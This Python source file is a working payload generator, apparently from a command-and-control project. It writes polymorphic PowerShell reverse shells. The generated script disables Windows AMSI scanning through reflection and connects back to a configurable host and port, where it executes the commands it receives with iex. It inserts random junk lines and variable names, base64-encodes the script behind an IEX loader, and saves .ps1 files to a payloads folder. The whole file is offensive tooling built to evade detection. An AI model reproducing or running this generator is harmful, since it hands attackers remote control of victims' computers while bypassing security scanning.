import random
import string
import os
import base64
from datetime import datetime

def rand_name(length=None):
    length = length or random.randint(8, 14)
    return ''.join(random.choices(string.ascii_letters, k=length))

def junk_code():
    j = [
        f"${rand_name()} = {random.randint(1,100)}",
        f"# {rand_name()}_{random.randint(1000,9999)}",
        f"$null = {random.randint(0,1)}",
        f"${rand_name()} = '{rand_name(3)}'",
        f"# {rand_name(4)}"
    ]
    return random.choice(j) + "\n"

def amsi_bypass_block(var):
    # Only field name is obfuscated for reliability
    field = '+'.join([f"'{c}'" for c in "amsiInitFailed"])
    return (
        f"${var['amsi_type']} = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n"
        f"${var['amsi_field']} = ${{{var['amsi_type']}}}.GetField({field},'NonPublic,Static')\n"
        f"${var['amsi_field']}.SetValue($null,$true)\n"
    )

def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
    var = {k: rand_name() for k in [
        "amsi_type", "amsi_field", "tcpclient", "stream", "bytes", "i", "data", "sendback",
        "sendback2", "sendbyte"
    ]}
    amsi_bypass = amsi_bypass_block(var)

    # DO NOT obfuscate class/type names! This is what breaks object creation!
    core_shell = (
        junk_code() +
        f"{amsi_bypass}"
        f"${var['tcpclient']} = New-Object System.Net.Sockets.TCPClient('{host}',{port})\n"
        f"${var['stream']} = ${{{var['tcpclient']}}}.GetStream()\n"
        f"${var['bytes']} = 0..65535|%{{0}}\n"
        f"while((${{var['i']}} = ${{{var['stream']}}}.Read(${{{var['bytes']}}},0,${{{var['bytes']}}}.Length)) -ne 0){{\n"
        f"    ${{var['data']}} = (New-Object System.Text.ASCIIEncoding).GetString(${{{var['bytes']}}},0,${{{var['i']}}})\n"
        f"    ${{var['data']}} = ${{var['data']}}.Trim()\n"
        f"    if (${{var['data']}}.Length -gt 0) {{\n"
        f"        ${{var['sendback']}} = (iex ${{{var['data']}}} 2>&1 | Out-String)\n"
        f"        ${{var['sendback2']}} = ${{{var['sendback']}}} + 'PS ' + (pwd).Path + '> '\n"
        f"        ${{var['sendbyte']}} = ([Text.Encoding]::ASCII).GetBytes(${{{var['sendback2']}}})\n"
        f"        ${{{var['stream']}}}.Write(${{{var['sendbyte']}}},0,${{{var['sendbyte']}}}.Length)\n"
        f"        ${{{var['stream']}}}.Flush()\n"
        f"    }}\n"
        f"}}\n"
        + junk_code()
    )

    # Loader: base64 encode everything except the AMSI bypass block (executes in the clear)
    core_shell_bytes = core_shell.encode('utf-8')
    core_shell_b64 = base64.b64encode(core_shell_bytes).decode()
    loader_var = rand_name()
    loader = (
        f"${loader_var} = '{core_shell_b64}'\n"
        f"IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${loader_var})))\n"
    )
    ps = loader

    if write_file:
        folder = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server', 'payloads'))
        os.makedirs(folder, exist_ok=True)
        filename = f"ps_payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.ps1"
        path = os.path.join(folder, filename)
        with open(path, 'w', encoding='utf-8') as f:
            f.write(ps)
        return filename
    else:
        return ps

# Alias for your other code
generate_polymorphic_ps = generate_obfuscated_ps
